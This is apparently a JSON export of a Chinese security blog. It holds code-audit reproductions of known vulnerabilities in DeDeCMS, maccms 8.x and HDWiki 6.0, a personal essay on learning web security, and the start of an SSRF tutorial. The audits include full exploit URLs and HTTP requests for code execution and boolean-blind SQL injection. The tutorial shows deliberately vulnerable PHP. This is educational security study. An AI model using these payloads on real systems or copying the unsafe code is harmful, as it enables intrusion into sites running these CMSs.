https://mochazz.github.io/2018/02/12/代码审计之zzcms82/","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"【代码审计】DeDeCMS 5.7 SP2后台代码执行漏洞（复现）","date":"2020-01-15T03:38:50.000Z","path":"code_audit/12.DeDeCMSV5.7 SP2审计/","text":"【代码审计】DeDeCMS 5.7 SP2后台代码执行漏洞（复现） 审计过程 漏洞文件发生在/dede/tpl.php中，程序直接将经过stripslashes()处理的$content写入了/include/taglib/xxx.lib.php文件。 这个文件的filename和content都没有定义，原因就在于全局变量注册的特性，在common.inc.php中定义了如何处理提交的参数： 并且还对提交的参数进行addslashes函数的处理。 回到tpl.php这个文件，csrf_check()在/dede/config.php中定义，用于检测token，我们可以访问/dede/tpl.php?action=upload来获取token值 访问：http://localhost/dedecms/dede/tpl.php?action=savetagfile&amp;filename=ca01h.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=5d2d1d2007a09f3b753b794ed0976449 Reference https://mochazz.github.io/2018/03/08/代码审计之DedeCMS V5.7 SP2后台存在代码执行漏洞（复现）/","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"【代码审计】苹果CMS8.X（复现）","date":"2020-01-15T03:38:50.000Z","path":"code_audit/14.maccms8.x审计/","text":"【代码审计】苹果cms8.x（复现） 审计过程 从index.php看起，首先就包含了两个文件：/inc/conn.php和/inc/common/360_safe3.php /inc/conn.php包含了六个文件： config.php是数据库db、ftp等等的配置信息； cache.php是缓存文件； class.php一共有三个类：AppDb、AppFtp和AppZip，都定义了各自的操作函数； function.php都是一些功能函数； template.php中有一个AppTpl类，并且新建了一个模板对象 1234567891011&lt;?phpclass AppTpl&#123; var $markname,$markpar,$markdes,$markval,$markhtml; function AppTpl() &#123; $this-&gt;P = array(&quot;vodtypeid&quot;=&gt;-1,&quot;vodtypepid&quot;=&gt;-1,&quot;vodtopicid&quot;=&gt;-1,&quot;arttypeid&quot;=&gt;-1,&quot;arttypepid&quot;=&gt;-1,&quot;arttopicid&quot;=&gt;-1,&quot;auto&quot;=&gt;false,&quot;pg&quot;=&gt;1); &#125;......$tpl = new AppTpl();?&gt; index.php包含的第二个文件/inc/common/360_safe3.php主要作用就是防止SQL注入和XSS： 回到index.php中，接下来的代码就是定义路由规则 第14行调用了be函数，对提交的参数$m进行addslashes函数处理： 再对提交的参数使用连接符-进行分割存到$par数组中，其中第一个元素是module，第二个元素是method，例如url：http://127.0.0.1/?m=vod-type-id-2.html表示的就是/inc/module/vod.php，并且method=type，$tpl-&gt;P['id']=2。 代码执行 漏洞发生在/inc/common/template.php文件类方法ifex()中的eval语句： 首先给出paylaod： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?m&#x3D;vod-search&amp;wd&#x3D;&#123;if-A:phpinfo()&#125;&#123;endif-A&#125; 根据之前的分析，找到/inc/common/vod.php文件的search处： 1234567891011121314151617181920212223242526# /inc/module/vod.php......elseif($method==&#x27;search&#x27;)&#123; $tpl-&gt;P[&quot;siteaid&quot;] = 15; $wd = be(&quot;all&quot;, &quot;wd&quot;); if(!empty($wd))&#123; $tpl-&gt;P[&quot;wd&quot;] = $wd; &#125; if ( $tpl-&gt;P[&#x27;pg&#x27;]==1 &amp;&amp; getTimeSpan(&quot;last_searchtime&quot;) &lt; $MAC[&#x27;app&#x27;][&#x27;searchtime&#x27;])&#123; showMsg(&quot;请不要频繁操作，时间间隔为&quot;.$MAC[&#x27;app&#x27;][&#x27;searchtime&#x27;].&quot;秒&quot;,MAC_PATH); exit; &#125; if (!isN($tpl-&gt;P[&quot;wd&quot;])) &#123; $tpl-&gt;P[&quot;key&quot;]=$tpl-&gt;P[&quot;wd&quot;] ; $tpl-&gt;P[&quot;des&quot;] = $tpl-&gt;P[&quot;des&quot;] . &quot;&amp;nbsp;名称或主演为&quot; . $tpl-&gt;P[&quot;wd&quot;]; $tpl-&gt;P[&quot;where&quot;] = $tpl-&gt;P[&quot;where&quot;] . &quot; AND ( instr(d_name,&#x27;&quot;.$tpl-&gt;P[&#x27;wd&#x27;].&quot;&#x27;)&gt;0 or instr(d_starring,&#x27;&quot;.$tpl-&gt;P[&#x27;wd&#x27;].&quot;&#x27;)&gt;0 ) &quot;; &#125; ...... $tpl-&gt;H = loadFile(MAC_ROOT_TEMPLATE.&quot;/vod_search.html&quot;); $tpl-&gt;mark(); $tpl-&gt;pageshow(); $colarr = array(&#x27;&#123;page:des&#125;&#x27;,&#x27;&#123;page:key&#125;&#x27;,&#x27;&#123;page:now&#125;&#x27;,&#x27;&#123;page:order&#125;&#x27;,&#x27;&#123;page:by&#125;&#x27;,&#x27;&#123;page:wd&#125;&#x27;,&#x27;&#123;page:wdencode&#125;&#x27;,&#x27;&#123;page:pinyin&#125;&#x27;,&#x27;&#123;page:letter&#125;&#x27;,&#x27;&#123;page:year&#125;&#x27;,&#x27;&#123;page:starring&#125;&#x27;,&#x27;&#123;page:starringencode&#125;&#x27;,&#x27;&#123;page:directed&#125;&#x27;,&#x27;&#123;page:directedencode&#125;&#x27;,&#x27;&#123;page:area&#125;&#x27;,&#x27;&#123;page:areaencode&#125;&#x27;,&#x27;&#123;page:lang&#125;&#x27;,&#x27;&#123;page:langencode&#125;&#x27;,&#x27;&#123;page:typeid&#125;&#x27;,&#x27;&#123;page:typepid&#125;&#x27;,&#x27;&#123;page:classid&#125;&#x27;); $valarr = array($tpl-&gt;P[&quot;des&quot;],$tpl-&gt;P[&quot;key&quot;],$tpl-&gt;P[&quot;pg&quot;],$tpl-&gt;P[&quot;order&quot;],$tpl-&gt;P[&quot;by&quot;],$tpl-&gt;P[&quot;wd&quot;],urlencode($tpl-&gt;P[&quot;wd&quot;]),$tpl-&gt;P[&quot;pinyin&quot;],$tpl-&gt;P[&quot;letter&quot;],$tpl-&gt;P[&#x27;year&#x27;]==0?&#x27;&#x27;:$tpl-&gt;P[&#x27;year&#x27;],$tpl-&gt;P[&quot;starring&quot;],urlencode($tpl-&gt;P[&quot;starring&quot;]),$tpl-&gt;P[&quot;directed&quot;],urlencode($tpl-&gt;P[&quot;directed&quot;]),$tpl-&gt;P[&quot;area&quot;],urlencode($tpl-&gt;P[&quot;area&quot;]),$tpl-&gt;P[&quot;lang&quot;],urlencode($tpl-&gt;P[&quot;lang&quot;]),$tpl-&gt;P[&#x27;typeid&#x27;],$tpl-&gt;P[&#x27;typepid&#x27;] ,$tpl-&gt;P[&#x27;classid&#x27;] ); $tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);...... 也就是说$tpl-&gt;P[&quot;wod&quot;]='&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;'，而且$tpl-&gt;H等于&quot;/template/paody/html/vod_search.html&quot;的内容，$tpl-&gt;P[&quot;key&quot;]等于$tpl-&gt;P[&quot;wod&quot;]。接着$tpl-&gt;H的内容还做了替换，把&#123;type:key&#125;替换成&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;' 继续看index.php页面，找到相应模块后，会调用template.php文件中的ifex()函数： 开头的$this-&gt;H在/inc/module/vod.php文件中已经定义。$labelRule等于/&#123;if-([\\s\\S]*?):([\\s\\S]+?)&#125;([\\s\\S]*?)&#123;endif-\\1&#125;/is，然后在$this-&gt;H中用这个pattern匹配，结果是一个二维数组，存储在$iar中。而payload中的phpinfo()将存储在$iar[2]中。 后台SQL注入 上面我们已经提到过苹果CMS使用be函数来获取参数 其中arr情况没有过滤，因此可以寻找一个arr的点。在/admin/tpl/module/art.php文件中存在： 12345678910111213141516171819202122elseif($method==&#x27;typesaveall&#x27;)&#123; $t_id = be(&#x27;arr&#x27;,&#x27;t_id&#x27;); $ids = explode(&#x27;,&#x27;,$t_id); foreach($ids as $id)&#123; $t_name = be(&#x27;post&#x27;,&#x27;t_name&#x27; .$id); $t_enname = be(&#x27;post&#x27;,&#x27;t_enname&#x27; .$id) ; $t_sort = be(&#x27;post&#x27;,&#x27;t_sort&#x27; .$id); $t_tpl = be(&#x27;post&#x27;,&#x27;t_tpl&#x27; .$id); $t_tpl_art = be(&#x27;post&#x27;,&#x27;t_tpl_art&#x27; .$id); if (isN($t_name)) &#123; $t_name=&#x27;未知&#x27;;&#125; if (isN($t_enname)) &#123; $t_enname=&#x27;weizhi&#x27;;&#125; if (!isNum($t_sort)) &#123; $t_sort=0;&#125; if (isN($t_tpl)) &#123; $t_tpl = &#x27;artlist.html&#x27;;&#125; if (isN($t_tpl_art)) &#123; $t_tpl_art = &#x27;art.html&#x27;;&#125; $db-&gt;Update (&#x27;&#123;pre&#125;art_type&#x27;,array(&#x27;t_name&#x27;,&#x27;t_enname&#x27;, &#x27;t_sort&#x27;,&#x27;t_tpl&#x27;,&#x27;t_tpl_art&#x27;),array($t_name,$t_enname,$t_sort,$t_tpl,$t_tpl_art),&#x27;t_id=&#x27;.$id); &#125; updateCacheFile(); redirect( getReferer() );&#125; $t_id参数使用了arr方法，并且代入了SQL语句中，但是POST存在如下过滤： 1$postfilter=&quot;^\\\\+\\/v(8|9)|\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|&lt;\\\\s*img\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;; 可以使用布尔盲注，另外不能使用逗号。substring方法的from…for…可以绕过逗号 的限制：SELECT SUBSTRING('Sakila' FROM -4 FOR 2);。payload： 12345678910111213141516POST &#x2F;admin&#x2F;index.php?m&#x3D;art-typesaveall HTTP&#x2F;1.1Host: maccms:8888Content-Length: 895Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;maccms:8888Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;maccms:8888&#x2F;admin&#x2F;index.php?m&#x3D;art-typeAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;adb86684e6ee83c4ff53caf12c86a13a; adminid&#x3D;1; adminname&#x3D;admin; adminlevels&#x3D;b%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj; admincheck&#x3D;a2355a779d57666d1b72a1845c1f469cConnection: closet_id%5B%5D&#x3D;1&amp;t_sort1&#x3D;1&amp;t_name1&#x3D;%E7%AB%99%E5%86%85%E6%96%B0%E9%97%BB&amp;t_enname1&#x3D;zhanneixinwen&amp;t_tpl1&#x3D;art_type.html&amp;t_tpl_art1&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;2&amp;t_sort2&#x3D;2&amp;t_name2&#x3D;%E5%A8%B1%E4%B9%90%E5%8A%A8%E6%80%81&amp;t_enname2&#x3D;yuledongtai&amp;t_tpl2&#x3D;art_type.html&amp;t_tpl_art2&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;3&amp;t_sort3&#x3D;3&amp;t_name3&#x3D;%E5%85%AB%E5%8D%A6%E7%88%86%E6%96%99&amp;t_enname3&#x3D;baguabaoliao&amp;t_tpl3&#x3D;art_type.html&amp;t_tpl_art3&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;4&amp;t_sort4&#x3D;4&amp;t_name4&#x3D;%E5%BD%B1%E7%89%87%E8%B5%84%E8%AE%AF&amp;t_enname4&#x3D;yingpianzixun&amp;t_tpl4&#x3D;art_type.html&amp;t_tpl_art4&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;5&amp;t_sort5&#x3D;5&amp;t_name5&#x3D;%E6%98%8E%E6%98%9F%E8%B5%84%E8%AE%AF&amp;t_enname5&#x3D;mingxingzixun&amp;t_tpl5&#x3D;art_type.html&amp;t_tpl_art5&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;7 or 1 &#x3D; (select ord(substring(user() from 1 for 1))&#x3D;114)-- 1&amp;t_sort6&#x3D;6&amp;t_name6&#x3D;%E7%94%B5%E8%A7%86%E8%B5%84%E8%AE%AF&amp;t_enname6&#x3D;dianshizixun&amp;t_tpl6&#x3D;art_type.html&amp;t_tpl_art6&#x3D;art_detail.html 此为正确查询，会把所有的条目都修改掉： Reference https://mochazz.github.io/2018/03/06/代码审计之苹果cms8.x代码执行（复现）/","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"【代码审计】HDWiki6.0 SQL注入漏洞（复现）","date":"2020-01-15T03:38:50.000Z","path":"code_audit/13.HDWiki6.0 sql注入/","text":"【代码审计】HDWiki6.0 sql漏洞（复现） 审计过程 首先从index.php入手： 包含了/model/hdwiki.class.php，这个文件是处理路由的关键文件，在构造函数中首先调用的是init_request.php，用来初始化请求信息： 123456789101112131415161718192021222324252627282930313233343536373839404142function init_request()&#123; if (!file_exists(HDWIKI_ROOT.&#x27;/data/install.lock&#x27;)) &#123; header(&#x27;location:install/install.php&#x27;); exit(); &#125; header(&#x27;Content-type: text/html; charset=&#x27;.WIKI_CHARSET); $querystring=str_replace(&quot;&#x27;&quot;,&quot;&quot;,urldecode($_SERVER[&#x27;QUERY_STRING&#x27;])); if(strpos($querystring , &#x27;plugin-hdapi-hdapi-default&#x27;) !== false)&#123; $querystring=str_replace(&#x27;plugin-hdapi-&#x27;, &#x27;&#x27;, $querystring); &#125; $pos = strpos($querystring , &#x27;.&#x27;); if($pos!==false)&#123; $querystring=substr($querystring,0,$pos); &#125; $this-&gt;get = explode(&#x27;-&#x27; , $querystring); if (count($this-&gt;get) &lt;= 3 &amp;&amp; count($_POST) == 0 &amp;&amp; substr($querystring, 0, 6) == &#x27;admin_&#x27; &amp;&amp; substr($querystring, 0, 10) != &#x27;admin_main&#x27;)&#123; $this-&gt;querystring = $querystring; &#125; if(empty($this-&gt;get[0]))&#123; $this-&gt;get[0]=&#x27;index&#x27;; &#125; if(empty($this-&gt;get[1]))&#123; $this-&gt;get[1]=&#x27;default&#x27;; &#125; if(count($this-&gt;get)&lt;2)&#123; exit(&#x27; Access Denied !&#x27;); &#125; //unset($_ENV, $HTTP_GET_VARS, $HTTP_POST_VARS, $HTTP_COOKIE_VARS, $HTTP_SERVER_VARS, $HTTP_ENV_VARS); $this-&gt;get = string::haddslashes($this-&gt;get,1); $this-&gt;post = string::haddslashes($_POST); $_COOKIE = string::haddslashes($_COOKIE); $this-&gt;checksecurity(); $remain=array(&#x27;_SERVER&#x27;,&#x27;_FILES&#x27;,&#x27;_COOKIE&#x27;,&#x27;GLOBALS&#x27;,&#x27;starttime&#x27;,&#x27;mquerynum&#x27;); foreach ($GLOBALS as $key =&gt; $value)&#123; if ( !in_array($key,$remain) ) &#123; unset($GLOBALS[$key]); &#125; &#125; &#125; 看完这段代码，可以初步知道这个CMS是首先拿到query_string的值，再用连接符-来划分控制器和方法，形如：http://127.0.0.1/index.php?admin_main-login，表示的就是/control/admin_main.php文件中的dologin方法。 另外，还对GET、POST和COOKIE参数进行字符转义，以及检查GET请求中是否有下列关键字： 123456789101112131415161718function checksecurity() &#123; $check_array = array( //于get请求 需要检查哪些关键词 &#x27;get&#x27;=&gt;array(&#x27;cast&#x27;, &#x27;exec&#x27;,&#x27;show &#x27;,&#x27;show/*&#x27;,&#x27;alter &#x27;,&#x27;alter/*&#x27;,&#x27;create &#x27;,&#x27;create/*&#x27;,&#x27;insert &#x27;,&#x27;insert/*&#x27;, &#x27;select &#x27;,&#x27;select/*&#x27;,&#x27;delete &#x27;,&#x27;delete/*&#x27;,&#x27;update &#x27;, &#x27;update/*&#x27;,&#x27;drop &#x27;,&#x27;drop/*&#x27;,&#x27;truncate &#x27;,&#x27;truncate/*&#x27;,&#x27;replace &#x27;,&#x27;replace/*&#x27;,&#x27;union &#x27;,&#x27;union/*&#x27;,&#x27;execute&#x27;, &#x27;from&#x27;, &#x27;declare&#x27;, &#x27;varchar&#x27;, &#x27;script&#x27;, &#x27;iframe&#x27;, &#x27;;&#x27;, &#x27;0x&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;\\\\&#x27;, &#x27;%27&#x27;, &#x27;%22&#x27;, &#x27;(&#x27;, &#x27;)&#x27;), ); foreach ($check_array as $check_key=&gt;$check_val) &#123; if(!empty($this-&gt;$check_key)) &#123; foreach($this-&gt;$check_key as $getvalue) &#123; foreach ($check_val as $invalue) &#123; if(stripos($getvalue, $invalue) !== false)&#123; $this-&gt;notfound(&#x27;page is not found!&#x27;); //exit(&#x27;No Aceess!注意敏感词!&#x27;); &#125; &#125; &#125; &#125; &#125; &#125; 这次出现SQL注入漏洞的地方是/control/edit.php中的docompare函数，触发这个函数的路由即为：http://127.0.0.1/index.php?edit-compare 前三个if语句可以不用管。第四个if语句判断参数eid数组的前两个元素是不是数字，如果不是就会跳转到index.php页面。第147行代码，通过array_slice函数获取参数eid的前两个元素，代入到get_edition函数中。 这里有一个小的trick：POST和GET传入的参数，键不会自动排序的，传的时候是什么顺序，接收到的就是什么顺序 ，也就是说传给get_edition()函数的参数是我们可以控制的，这是发生注入的关键之一。 继续跟进get_edition函数： 当get_edition()函数的参数是数组的时候，则会直接用逗号拼接数组中的所有值，然后直接带入数据库查询，这里就是发生注入的关键之二。所以我们最终的payload为： 12345678910111213POST &#x2F;index.php?edition-compare HTTP&#x2F;1.1Host: 192.168.0.23User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.62 Safari&#x2F;537.36Upgrade-Insecure-Requests: 1Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;jovcdmbvja39irn9a9rso7sru6; hd_sid&#x3D;lZLd3C; hd_auth&#x3D;1bc4Iyy%2BgM7glSiQe3yWq7wFPWdvuO4ZGw1vEvrrzMuWdTX1kXSaxhS54Lzd8pYu%2BBGftcSI3Yy6wuwCdyI7Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 78eid[2]&#x3D;199&amp;eid[3]&#x3D;299) or if(ascii(left(user(),1))&#x3D;114,1,0)#&amp;eid[0]&#x3D;3&amp;eid[1]&#x3D;4 使用布尔盲注，通过页面回显来判断查询语句的正确性。 Reference https://mochazz.github.io/2018/03/05/代码审计之HDwiki6.0（复现）/","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"从0到100分的路程——写在2019年的最后一天","date":"2019-12-31T13:15:19.000Z","path":"Essay/从0到100分的路程——写在2019年的最后一天/","text":"从0到100分的学习心得 大家好，我是ca01h，今年8月份加入了信安之路小白成长计划，5个月的时间过去，很意外地成为了群里第一个到达100分的男人。纸面上来看是0到100分的变化，而对我自己而言，意味着终于跨入了Web安全的领域，也算是融入了一个安全的圈子。与此同时，很荣幸接到良哥的邀请，为平台的其他小伙伴们写一写这几个月学习成长过程期间的经验之谈，刚好我也准备给自己做一个阶段性的总结以及对未来的短期规划，遂欣然接受。但真正到了提笔撰文的时候，除了兴奋之外亦有些惶恐，惶恐是因为感觉自己资质尚浅不足以支撑一篇经验贴，直白点就是太菜了，还有太多太多的知识面、技能表、奇技淫巧需要挖掘和学习，但既然已经答应了良哥，无论如何硬着头皮都要完成这个任务。当然，这篇文章也是面向平台的其他小伙伴们，望借拙笔浅文，与大家分享。 4个多月的时间100分，完成11个任务，平均下来每个任务得9分左右，也只能是中规中矩吧，不算优秀。现在回想起来，做前面几个任务的时候还没有摸到门道，是比较简单机械的搬运工，经过几个月的学习算是有点上道了，有了自己的实践操作，加上了自己对这个类型漏洞的理解和总结。到了后面经常两个星期才能完成一个报告，会在云服务器上自己搭建的漏洞环境因为某个问题而纠缠半天，也会为了大牛的博客上轻轻带过的一句话而深究背后的原理。是的，一篇报告不仅仅是时间堆砌出来的，更需要用心去书写和理解，用手去做实验得结果。就拿最近一篇关于SSRF漏洞的报告来说，我首先从《Web安全攻防》这本书出发，只有寥寥数页，比较粗略的讲了它的原理、可利用的地方以及简单的代码分析，看完之后意犹未尽感觉远远不够，于是Google找到了一篇文章，这个博文相对于书籍来说已经很充实了，漏洞的产生条件、利用方式、实际利用、Bypass等等都比较详细，对于我来说欣喜不已，遂认真品读起来，看完这篇文章确实给了我一个对于SSRF漏洞比较全面的认知。但实践出真知，到我真正去复现一些细节的时候，上面却没有提到太多，有的甚至一笔带过，但我肯定不能就此敷衍过去，又找了很多其他的资料，不断地扩充自己的报告的细节，解决问题的方法肯定不止一种，有的是用现成工具和命令来生成payload，而有的是自己截获流量经过一系列手段来构造payload。并不是说直接用工具不好，而是对自己的成长作用不大，可以作为参考，但绝非最优。当然，我自己还是觉得之前做的还是有些不足，比如缺少一些漏洞的实例，就拿SSRF来说，我最近看到一篇文章Vimeo upload function SSRF，打算动手来试一试，也算是再一次加深印象和理解。总的来说，对于一个初学者而言，学习无非就是发现问题、查找问题、解决问题，最后的结果取决于这个过程，而这个过程又取决于你对它的态度。 上面简单的谈了一下这段时间我在写报告时候的一些感受和想法，既然作为分享，我就想分享的更为极致一些，接着说一说我自己目前学习期间的一些方法论。 首先，我认为需要一个知识库。现在是碎片化时代，生活中充斥着碎片化的时间、碎片化的内容、碎片化的知识等等，这让我们没有大段的专注时间，一种比较好的解决方式是体系化、文档化、数字化梳理和总结知识，管理学习，加深理解。比如我自己搭了一个简单的个人Wiki网站，用来收录整理文章，分块管理，便于查阅温故。也并不是说非要搭建一个博客，网上也有很多可以分享记录的网站，总而言之，好记性不如烂笔头，文档化系统化是用来记录碎片化时间的所学所思最好的办法。 其次，计算机这门学科日益更新，信安尤其如此，虽然作为初学者，但我还是觉得要接触一些前沿的知识和新闻，这样才能在学习原理的时候能上手体验一下真实案例。我推荐几个我个人正在使用的信息源，一是腾讯玄武实验室和天融信阿尔法实验室，它们每天都会分享比较新比较优秀的文章，包括具体技术、最新漏洞、恶意代码、工具使用等等，上面提到的那篇关于Vimeo的SSRF上传漏洞就是前几天浏览看到的。我觉得这种形式还是很好的，也不用全盘接收，比较高效地获取知识，就看看是否有关于自己正在做的工作的文章或者感兴趣的知识点，记录下来。此外，大佬的博客也可以时常关注，比如说P牛、c0ny1、Knownsec、404 not found等等等，再此就不一一举例了。那么有的同学就会问，需要每天去他们的博客浏览一遍看有没有发新文章吗？其实也用不着，Chrome有一个扩展插件叫RSS Feed Reader用来整合RSS订阅，如果发布了新文章它就会有相应的提醒，很方便。 再者，CTF确实是学习Web安全的好途径。我在11月份的时候和很厉害的师兄一起参加了校赛NCTF，虽然被虐出翔了，这个经历回想起来也很心痛，但在打比赛的时候解出题目是学习新知识的最大动力，也是检验自己能力的一种方式。至于关于CTF方面，这里就不展开讲了，星球上也有很多关于CTF的文章，都可以参考参考。 这半年来的学习经验也差不多言尽于此了。现在想想自己为什么头铁两次考研非要选择这一行，反倒有些道不清原因了。本科的时候也是做信安的，不过更多的是放在了Linux系统内核安全加固方面，也做出了些东西顺带拿了个国奖。可能是感觉底层这一块还是不太适合我，有些力不从心了，或者觉得这个方向的就业面太窄了，当时恰好有一位学长是搞web安全的，在我面前演示了一把拿到某个后台系统管理员权限，看着他打了几场CTF比赛，也许真的是兴趣使然，恰好到了考研的准备的阶段，于是就下定决心读研转Web安全方向。虽然有些坎坷，现在也算是坐在这个位置上了，但也正是到了更高的平台上，才发现自己入行太晚了。相比而言，学弟学妹们大一大二就入了门，优秀一点的都已经拿了不少线下攻防大赛的一等奖、第一名，暑假去大厂实习。像我这种大龄选手已经没法比了，自己在学习的时候别人也在学，唯一的选择就是花更多的时间，下更大的功夫。讲真，虽说遗憾，但也无悔。 说到这里，一般都到了立flag的时间，我也不例外，明天就是2020年了，新的一年做个短期规划也是挺不错的。对于Web安全这条路，我加入之前这个平台之前，也很想学Web安全，也在各大论坛看了不少的经验贴，但说到底还是别人的经验，我不知道我要学什么，目标是什么，怎么样走下去，这些都非常地困惑我。现在，我会继续跟着良哥的计划走，在年底之前完成web安全的剩余任务，同时开启渗透测试的新篇章，以某个SRC为目标体验渗透的过程。在此期间，我也会在前期试着看一些现有的教程玩一玩Hack the box靶机，毕竟在当前的法律法规面前，打靶机还是不错的选择。另外还有更重要的一条路线就是漏洞挖掘（也有可能是代码审计）+机器学习，毕竟是要出论文的，单独一个Web安全写不出什么太多的花样，希望自己能结合当前比较火热的ML、DL等作为自己日后的研究方向，目前在看吴恩达老师的机器学习课程，学完了基础知识再去研究具体的工作。要是哪位大佬正在搞这个，希望能带带小弟共同交流。 好了，文章的最后，就用一句话与小伙伴们共勉：学习之路，道阻且长，上下求索。","tags":[{"name":"经验","slug":"经验","permalink":"http://ca0y1h.top/tags/%E7%BB%8F%E9%AA%8C/"}],"categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://ca0y1h.top/categories/%E6%9D%82%E8%B0%88/"}]},{"title":"Web安全基础学习之SSRF漏洞利用","date":"2019-12-17T11:34:00.000Z","path":"Web_security/basic_learning/17.SSRF漏洞利用/","text":"Web安全基础学习之SSRF漏洞利用 什么是ssrf SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。 简单来讲就是，服务器会响应用户的url请求，但是没有做好过滤和限制，导致可以攻击内网。 漏洞产生 由于服务端提供了从其他服务器应用获取数据的功能且没有对用户可控的目标地址做过虑与限制。 在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数。 file_get_contents() file_get_contents是把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取。 123456789101112&lt;?phpif(isset($_POST[&#x27;url&#x27;]))&#123; $content=file_get_contents($_POST[&#x27;url&#x27;]); $filename=&#x27;./images/&#x27;.rand().&#x27;.img&#x27;;\\ file_put_contents($filename,$content); echo $_POST[&#x27;url&#x27;]; $img=&quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; &#125;echo $img;?&gt; fsockopen() fsockopen()函数本身就是打开一个网络连接或者Unix套接字连接。 12345678910111213141516&lt;?php$host=$_GET[&#x27;url&#x27;];$fp = fsockopen(&quot;$host&quot;, 80, $errno, $errstr, 30);if (!$fp) &#123; echo &quot;$errstr ($errno)&lt;br /&gt;\\n&quot;;&#125; else &#123; $out = &quot;GET / HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; fwrite($fp, $out); while (!feof($fp)) &#123; echo fgets($fp, 128); &#125; fclose($fp);&#125;?&gt; curl() 这应该是大家最熟悉的一个函数了，因为利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于curl()函数的利用方式。 这里一定要安装PHP的curl扩展！！！Windows环境下php-study用多了，到了Linux环境都不知道怎么搭环境了。（折腾了一下午发现没有安装php-curl…==）https://segmentfault.com/a/1190000009068818 12345678910function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET[&#x27;url&#x27;];curl($url); 